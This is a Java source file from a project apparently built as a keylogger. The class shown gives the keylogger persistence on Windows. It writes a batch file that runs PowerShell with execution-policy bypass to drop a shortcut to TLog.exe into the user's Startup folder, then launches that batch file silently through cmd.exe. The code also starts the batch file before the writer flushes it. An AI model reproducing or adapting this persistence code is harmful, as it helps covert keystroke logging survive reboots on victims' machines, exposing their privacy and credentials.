package keylogger;

import utils.Logger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class SetStartUpWindows {
    private static final String WINDOWS_STARTUP_PATH = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
    private static final String TLOG_EXE = "TLog.exe";
    private static final String BAT_FILE = "run.bat";

    public static void createBatFile() {
        String tLogStartupPath = System.getProperty("user.home") + WINDOWS_STARTUP_PATH + "/TLog.lnk";
        File tLogExe = new File(TLOG_EXE);
        File batFile = new File(BAT_FILE);
        if (!batFile.exists()) {
            try (FileWriter fw = new FileWriter(batFile); BufferedWriter bw = new BufferedWriter(fw)) {
                bw.write("set TARGET='" + tLogExe.getAbsolutePath() + "'");
                bw.newLine();
                bw.write("set SHORTCUT='" + tLogStartupPath + "'");
                bw.newLine();
                bw.write("set PWS=powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile");
                bw.newLine();
                bw.write("%PWS% -Command \"$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(%SHORTCUT%); $S.TargetPath = %TARGET%; $S.Save()\"");
                startBatFile(batFile);
            } catch (IOException e) {
                Logger.insertLog(e);
            }
        }
    }

    private static void startBatFile(File file) {
        Runtime rt = Runtime.getRuntime();
        try {
            rt.exec(new String[]{"cmd.exe", "/c", "start " + file.getAbsolutePath()});
        } catch (IOException e) {
            Logger.insertLog(e);
        }
    }
}
